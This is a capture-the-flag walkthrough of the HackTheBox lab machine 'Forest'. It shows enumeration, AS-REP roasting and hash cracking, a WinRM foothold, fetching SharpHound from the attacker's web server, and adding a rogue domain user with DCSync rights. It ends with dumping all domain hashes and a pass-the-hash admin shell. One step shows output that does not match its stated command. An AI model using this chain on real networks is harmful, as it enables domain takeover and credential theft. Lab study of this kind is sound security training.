# Forest - Ashbo3n

## Initial FootHold

### Discovery and Enumeration

We will use nmap to discover ports, Nmap command:

```
sudo nmap $IP -sVC -vv -oN Nmap/tcp_nmap --min-rate=5000
```

- $IP Should be replaced by Actual IP
- -sVC is combined flag for -sV -sC which discovers versions and run default nmap scan on it
- -oN saves the file and Nmap/ is the dir with tcp\_nmap as the name
- --min-rate=5000 sends 5000 packets per second, usually too aggressive but for Retired machine it should be fine

Result:

```
PORT     STATE SERVICE      REASON          VERSION                                                                                                                                                                                      
53/tcp   open  domain       syn-ack ttl 127 Simple DNS Plus                                                                                                                                                                              
88/tcp   open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-03-05 12:01:04Z)                                                                                                                               
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC                                                                                                                                                                        
139/tcp  open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn                                                                                                                                                                
389/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)                                                                                                   
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)                                                                                                                             
464/tcp  open  kpasswd5?    syn-ack ttl 127                                                                                                                                                                                              
593/tcp  open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0                                                                                                                                                          
636/tcp  open  tcpwrapped   syn-ack ttl 127                                                                                                                                                                                              
3268/tcp open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)                                                                                                   
3269/tcp open  tcpwrapped   syn-ack ttl 127                                                                                                                                                                                              
5985/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                                                      
|_http-title: Not Found                                                                                                                                                                                                                  
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                                                                                              
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-05T12:01:20
|_  start_date: 2026-03-05T11:55:28
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-03-05T04:01:23-08:00
|_clock-skew: mean: 2h46m55s, deviation: 4h37m10s, median: 6m54s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 36501/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 36916/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 32697/udp): CLEAN (Timeout)
|   Check 4 (port 53829/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```

Running NetExec (NXC) :

```bash
┌──(Ash㉿kali)-[~/HTB/Easy/Forest]
└─$ nxc smb 10.129.95.210                                                                              
SMB         10.129.95.210   445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 

```

Add `FOREST.htb.local` AND `htb.local` to your `/etc/hosts` And then we can check if rpcclient allows for anonymous login with the command:

```
 rpcclient -U "" -N $IP
```

And we can log in successfully, we can use the following command to dump all the users:

```
rpcclient -U "" -N 10.129.95.210 -c "enumdomusers" | awk -F'[' '{print $2}' | awk -F']' '{print $1}' > full_usernames.txt
```

And it should return a hash like this:

```
] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:2d5a496d7f5f2b1327e5eb046aa066cf$53cd206fb5da42495d2471ca989616f9219b63547203fa2fa1f8bc6a02e99354ddc7e480919c0a129af1a65f6d9edcc46adbdface414517a986136c59ad620debb7bcbcf8f2a0fac3eeb3737c7541f3a786282ca941fa50433624e6ec33eb9fc9181aa22a9f080dff03bd958a02158a2fa944444b974dcaa69854955496e6e7a56607dd72322ef17394cff18ed70001a0ed038f3754c88cdc95221574a1d8bf3de536f0b4a1bed93a1bd1a4d8ee0861d20b7019f549cb785ef048677c841266706b5f7f198fcbd4dfb0ce4fc5ab6eb4bdd125c94d4914ccb8ae2a7ce0b67941b60216766df8f
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set

```

note that we can also use ldap to get all users but the one that returned the hash won't be there:

```
ldapsearch -x -H ldap://10.129.95.210 -b "dc=htb,dc=local" -E pr=1000/noprompt "(objectClass=user)" sAMAccountName | grep "sAMAccountName:"
```

Now We can crack the hash with the help of hashcat:

```
hashcat -m 18200 [Hash fileName] [Path to Rockyou.txt]
```

result:

```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:08ba35f5e231568d14df2a2af1d18e91$595ff78393c9a56e80e60c98bbec3fbb9f6398de38e13d655073fd3a693aa90f23412236644e0db87e3a5bcd4d634957cf9196ca5b728c6b40740dc69b02d56d19f7efdb62f1a45ddfc473948def942a107
89c3144086ba5213e15411488b0e6c78e0adb03fdd6b748fd2b4ad5ecc4678696922a1cf2125bb7171dcbe0a69b861044478794169ce20bfd97a071ed4e7ed99fa611294f1fb65a60696df556e79cb17f29140953ebf73c9c64930e6b025073193654ebc009a95a0c7b21b1a8a8443cf991a12e48
850f9df7daf11993a1f1895c4b376144416d9fcb073af68b58c33da1bebb2593:s3rvice                                                                                                                                                                 
                                                                                                                                                                                                                                         
Session..........: hashcat                                                                                                                                                                                                               
Status...........: Cracked                                                                                                                                                                                                               
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:08ba35f5e23156...bb2593
Time.Started.....: Thu Mar  5 08:58:08 2026 (2 secs)
Time.Estimated...: Thu Mar  5 08:58:10 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
<SNIP>
```

```
──(Ash㉿kali)-[~/HTB/Easy/Forest]
└─$ hashcat -m 18200 alfredo.hash ~/Wordlists/rockyou.txt --show                                      
$krb5asrep$23$svc-alfresco@HTB.LOCAL:08ba35f5e231568d14df2a2af1d18e91$595ff78393c9a56e80e60c98bbec3fbb9f6398de38e13d655073fd3a693aa90f23412236644e0db87e3a5bcd4d634957cf9196ca5b728c6b40740dc69b02d56d19f7efdb62f1a45ddfc473948def942a107
89c3144086ba5213e15411488b0e6c78e0adb03fdd6b748fd2b4ad5ecc4678696922a1cf2125bb7171dcbe0a69b861044478794169ce20bfd97a071ed4e7ed99fa611294f1fb65a60696df556e79cb17f29140953ebf73c9c64930e6b025073193654ebc009a95a0c7b21b1a8a8443cf991a12e48
850f9df7daf11993a1f1895c4b376144416d9fcb073af68b58c33da1bebb2593:s3rvice  
```

Now if we remember we have Win-RM opened, we can login into it with the command:

```
evil-winrm -i [Target Machine IP] -u 'svc-alfresco' -p 's3rvice'
```

And we can get user.txt with the command

```
cat C:\Users\svc-alfresco\Desktop\user.txt
```

Now that we have a shell we can either download SharpHound.ps1 OR you might find in dir `/usr/share/bloodhound/` Either way transfer it over to the target, i m using wget for it, Start a python web server on any port you like, i am starting it on port 8001:

```
python3 -m http.server 8001
```

Now download it with the command:

```
wget http://[Your tun0 IP]:[Web Server Port]/SharpHound.ps1 -UseBasicParsing -OutFile SharpHound.ps1
```

Run it with:

```
. .\SharpHound.ps1
```

Then run:

```
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\svc-alfresco\Downloads\
```

Output:

```
-a----         3/5/2026   6:36 AM          18688 20260305063607_BloodHound.zip
-a----         3/5/2026   6:36 AM          19605 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----         3/5/2026   6:30 AM        1308348 SharpHound.ps1

```

Now transfer this over to your attacking machine, we can do this by using evil-winrm download command, syntax goes by download \[File Name\] in my case its:

```
download 20260305063607_BloodHound.zip
```

Now we have to start BloodHound console, run this commands one by one;

```
sudo neo4j console
```

<span class="hljs-comment">Wait for it to say 'Remote interface available at http://localhost:7474/'</span>

<span class="hljs-comment">In a new Terminal run:</span>

```
bloodhound
```

Now open the zip into bloodhound, now we can view that we member of Account Operators so we can Create and Modify Objects, Manage Attributes and etc, we will add a user to domain controller, the command is:

```
net user Ashbo3n WannaCry /add /domain
```

Command Break Down:

- **`net user`**: Calls the Windows utility for managing user accounts.
- **`Ashbo3n`**: This is the **username** for the new account being created.
- **`WannaCry`**: This sets the **password** for the new account (a cheeky nod to the 2017 ransomware).
- **`/add`**: Instructs the system to **create** a new account rather than modify an existing one.
- **`/domain`**: This is the most critical part for an AD environment. It tells the computer to send this request to the **Domain Controller (DC)** to create a **Domain User**, rather than a local user on the machine you are typing on.

Now run this:

```
net group "Exchange Windows Permissions" Ashbo3n /add

```

And

```
net localgroup "Remote Management Users" Ashbo3n /add
```

The commands above create a new user named Ashbo3n and add him to the required groups. Next, download the PowerView script and import it into the current session. Link to powerview script -&gt; [github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](http://localhost:4444/github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

Either Download it first and start listener and then use the wget command we used above just modify the name of script, anyway after uploading it to target machine, we can use the Add-ObjectACL with Ashbo3n credentials, and give him DCSync rights.

run:

```
. .\PowerView.ps1
```

And

```
$pass = convertto-securestring 'WannaCry' -asplain -force
```

And

```
$cred = new-object system.management.automation.pscredential('htb\Ashbo3n', $pass)
```

And

```
Add-ObjectACL -PrincipalIdentity Ashbo3n -Credential $cred -Rights DCSync
```

run a dcsync attack. The secretsdump script from Impacket can now be run as Ashbo3n and used to reveal the NTLM hashes for all domain users.

```
Password:                                                                                                                                                                                                                                
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied                                                                                                                                                       
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                                                            
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                                                                     
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::                                                                                                                                         
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                                           
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::                                                                                                                                                          
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                                  
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                 
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                 
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                 
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                 
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                 
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                 
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                 
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                 
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                 
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                 
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::                                                                                                                                 
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::                                                                                                                                 
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::                                                                                                                                 
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::                                                                                                                                 
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::                                                                                                                                 
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::                                                                                                                                 
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::                                                                                                                                 
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::                                                                                                                                 
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::                                                                                                                                 
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::                                                                                                                                 
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::                                                                                                                                 
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::                                                                                                                                            
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::                                                                                                                                              
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::                                                                                                                                         
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::                                                                                                                                                 
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::                                                                                                                                                 
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::                                                                                                                                                
Ashbo3n:10101:aad3b435b51404eeaad3b435b51404ee:27c3d003134ff748ccf0d069e875880d:::                                                                                                                                                       
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:65350aca17b9a1ed52ec11d0c76b3e0c:::                                                                                                                                                        
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::                                                                                                                                                        
[*] Kerberos keys grabbed                                                                                                                                                                                                                
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913                                                                                                                         
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375                                                                                                                                                         
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b                                                                                                                                                                                     
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b                                                                                                                                          
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58                                                                                                                                                                          
krbtgt:des-cbc-md5:9dd5647a31518ca8     
<SNIP>
```

`htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::`

- **Username:** `Administrator`
- **RID:** `500` (The built-in Administrator account)
- **LM Hash:** `aad3b435b51404eeaad3b435b51404ee` (Empty/Disabled)
- **NT Hash:** **`32693b11e6aa90eb43d32c72a07ceea6`**

Lastly Get a shell with:

```
impacket-psexec administrator@10.129.95.210 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

You can view the root.txt with:

```
type C:\Users\Administrator\Desktop\root.txt
```
